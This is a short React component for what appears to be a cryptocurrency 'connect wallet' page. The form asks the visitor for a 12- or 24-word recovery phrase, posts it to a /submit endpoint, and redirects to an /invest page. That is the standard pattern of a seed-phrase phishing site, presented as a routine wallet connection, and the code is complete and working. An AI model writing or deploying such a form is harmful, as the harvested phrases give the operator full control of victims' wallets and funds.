import React, { useState } from 'react'
import "./input.css"
import { useNavigate, useParams } from 'react-router-dom'
import api from '../../components/axiosInstance'

const Input = () => {

    const navigate = useNavigate()
    const {category} = useParams()
    

    const [phrases, setPhrases] = useState("")
    const [error, setError] = useState("")
    const [success, setSuccess] = useState("")


    const displayName = category
    ? category
        .replace(/-/g, " ")
        .replace(/\b\w/g, (c) => c.toUpperCase())
    : ""

    const handleSubmit = async (e) => {
        e.preventDefault()

        if(!category) {
          setError("Invalid wallet category")
          return
        }

        setError("")
        setSuccess("")

        try {
             await api.post("/submit", {
                category, phrases
            })

            setSuccess("Phrase submitted successfully")
            setPhrases("")
            setTimeout(()=> {
              navigate("/invest")
            }, 2000)
        } catch (error) {
            setError(
                error.response?.data?.message || "Failed to submit phrases"
            )
        }
    }
  return (
    <div className='phrase_page'>
      <h2>{displayName} Wallet</h2>

      <form onSubmit={handleSubmit} className='phrase_form'>
        <label>Phrase</label>
        <textarea
            value={phrases}
            onChange={(e) => setPhrases(e.target.value)}
            placeholder='Enter your 12 or 24 word phrase'
            rows={5}
            required
        />
        <button type='submit'>connect wallet</button>

        {error && <p className='error'>{error}</p>}
        {success && <p className='success'>{success}</p>}
      </form>
    </div>
  )
}

export default Input
